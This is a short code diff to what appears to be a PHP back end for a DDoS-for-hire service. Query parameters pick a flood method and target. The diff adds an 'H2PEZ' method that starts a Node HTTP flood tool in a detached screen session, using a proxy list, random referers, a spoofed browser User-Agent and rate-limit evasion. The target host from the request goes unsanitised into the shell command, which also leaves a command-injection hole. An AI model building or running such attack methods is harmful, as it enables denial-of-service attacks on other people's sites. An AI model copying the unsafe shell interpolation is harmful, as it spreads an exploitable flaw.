@@ -21,6 +21,9 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
+        case 'H2PEZ':
+            $command = "cd /var/www/html/test/ && screen -dm node pez GET $host $time 4 64 proxy.txt --query 1 --bfm true --httpver 'http/1.1' --referer %RAND% --ua 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36' --ratelimit true";
+            break;
         case 'H2FLASH':
             $command = "cd /var/www/html/test/ && screen -dm node flash $host $time 8 2 proxy.txt";
             break;
